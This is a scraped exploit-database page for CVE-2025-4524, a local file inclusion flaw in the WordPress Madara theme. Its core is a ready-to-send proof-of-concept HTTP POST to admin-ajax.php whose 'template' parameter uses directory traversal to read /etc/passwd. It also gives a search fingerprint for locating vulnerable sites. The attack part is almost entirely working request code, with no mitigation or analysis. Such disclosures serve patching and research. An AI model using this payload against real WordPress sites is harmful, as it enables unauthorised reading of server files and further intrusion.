---
title: WordPress  Madara Local File Inclusion
url: https://cxsecurity.com/issue/WLB-2026040012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-14
fetch_date: 2026-04-15T04:42:39.695230
---

# WordPress  Madara Local File Inclusion

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Madara Local File Inclusion** **2026.04.14**  Credit:  **[Beatriz Fresno Naumova](https://cxsecurity.com/author/Beatriz%2BFresno%2BNaumova/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-4524](https://cxsecurity.com/cveshow/CVE-2025-4524/ "Click to see CVE-2025-4524")**  CWE: **[CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

# Exploit Title: WordPress Madara Local File Inclusion
# Date: November 1, 2025
# Exploit Author: Beatriz Fresno Naumova
# Vendor Homepage: WordPress Theme Madara
# Software Link: WordPress Theme Madara
# Tested on: [OS / PHP / WordPress versions used in testing — e.g., Ubuntu 22.04, PHP 8.1, WP 6.4]
# CVE: CVE-2025-4524
#Attack Vector
body="/wp-content/plugins/madara/"
#POC
POST /wp-admin/admin-ajax.php HTTP/2
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 490
action=madara\_load\_more&page=1&template=plugins/../../../../../../../etc/passwd&vars%5Borderby%5D=meta\_value\_num&vars%5Bpaged%5D=1&vars%5Btimerange%5D=&vars%5Bposts\_per\_page%5D=16&vars%5Btax\_query%5D%5Brelation%5D=OR&vars%5Bmeta\_query%5D%5B0%5D%5Brelation%5D=AND&vars%5Bmeta\_query%5D%5Brelation%5D=AND&vars%5Bpost\_type%5D=wp-manga&vars%5Bpost\_status%5D=publish&vars%5Bmeta\_key%5D=\_latest\_update&vars%5Border%5D=desc&vars%5Bsidebar%5D=right&vars%5Bmanga\_archives\_item\_layout%5D=big\_thumbnail

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top